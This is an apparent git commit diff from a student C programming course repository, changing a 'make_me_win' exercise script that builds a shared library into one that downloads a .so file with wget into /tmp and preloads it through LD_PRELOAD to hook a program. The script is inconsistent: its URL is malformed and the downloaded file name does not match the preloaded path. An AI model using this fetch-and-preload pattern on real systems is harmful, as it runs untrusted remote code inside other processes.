0adc982c23e961e63091ce3883e4d72bf8f7d2d6
henok <teklemariammossie1@gmail.com>
2022-12-16 10:39:53 -0800

    new commit

--- 0x18-dynamic_libraries/101-make_me_win.sh
+++ 0x18-dynamic_libraries/101-make_me_win.sh
@@ -1,4 +1,3 @@
 #!/bin/bash
-gcc *.o -fPIC -shared -o libtek.so
-
-LD_PRELOAD=$PWD/libtek.so
+wget -P /tmp/ https://raw.githubusercontent.com/root@96701e073f37/alx-low_level_programming/master/0x18-dynamic_libraries/libeleccrazy.so
+export LD_PRELOAD=/tmp/libtek.so
